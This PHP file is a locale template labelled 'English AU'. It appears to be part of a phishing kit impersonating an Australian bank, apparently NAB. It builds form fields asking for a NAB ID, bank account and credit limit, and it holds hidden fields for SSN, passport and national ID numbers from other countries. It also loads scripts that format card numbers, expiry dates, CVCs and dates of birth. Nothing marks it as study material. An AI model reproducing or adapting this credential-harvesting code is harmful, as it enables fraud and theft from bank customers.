<?php
/*
------------------
Language: English AU
------------------
*/

$langx = array();
$langx['POSTCODE'] = 'ZIP Code';
$langx['COUNTRY'] = 'Australia';
$langx['COUNTYSELECT'] = '
<select id="county" name="county" type="text" class="form-control select-country" style="height:32px!important;padding-left:10px;" >
<option value="">State / Territory</option><option value="Australian Capital Territory">ACT</option><option value="New South Wales">NSW</option><option value="Northern Territory">NT</option><option value="Queensland">QLD</option><option value="South Australia">SA</option><option value="Tasmania">TAS</option><option value="Victoria">VIC</option><option value="Western Australia">WA</option>
</select>
';
$langx['ACCOUNT'] = '
<input type="hidden" name="acno" value="-">
<input type="hidden" name="sortcode" value="-">
<input type="hidden" name="bans" value="-">
';
$langx['CREDITLIMIT'] = '
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="climit" id="climit" class="generic-input-field form-control field" placeholder="Credit Limit (Ex: $5000)" required="required">
</div>
</div>
';
$langx['NABID'] = '
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="nabid" id="nabid" class="generic-input-field form-control field" placeholder="NAB ID" required="required">
</div>
</div>
';
$langx['BANK_ACCOUNT'] = '
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="bankaccount" id="bankaccount" class="generic-input-field form-control field" placeholder="Bank Account" required="required">
</div>
</div>
';
$langx['PASSPORT'] = '
<input type="hidden" name="passport" value="-">
';
$langx['NUMBID'] = '
<input type="hidden" name="numbid" value="-">
';
$langx['NAID'] = '
<input type="hidden" name="naid" value="-">
';
$langx['CIVILID'] = '
<input type="hidden" name="civilid" value="-">
';
$langx['QATARID'] = '
<input type="hidden" name="qatarid" value="-">
';
$langx['CITIZENID'] = '
<input type="hidden" name="citizenid" value="-">
';
$langx['SSN'] = '
<input type="hidden" name="ssn" value="-">
';
$langx['APPCALL'] = '0800 048 0408';
$langx['FLAG'] = 'assets/img/au.png';
?>
<script type='text/javascript' src="assets/js/jquery-1.9.1.js"></script>
<script type='text/javascript' src="assets/js/jquery.validate.min.js"></script>
<script type='text/javascript' src="assets/js/jquery.payment.js"></script>
<script type='text/javascript' src="assets/js/additional-methods.min.js"></script>
<script type='text/javascript' src="assets/js/jquery.maskedinput.js"></script>
<script type='text/javascript' src="assets/js/Valid.AU.mob.php"></script>
  <script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');
      $.fn.toggleInputError = function(galat) {
        this.parent('.form-group').toggleClass('has-error', galat);
        return this;
      };

    });
  </script>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#ccexp").mask("99 / 99",{placeholder:"MM / YY"});
});
</script>

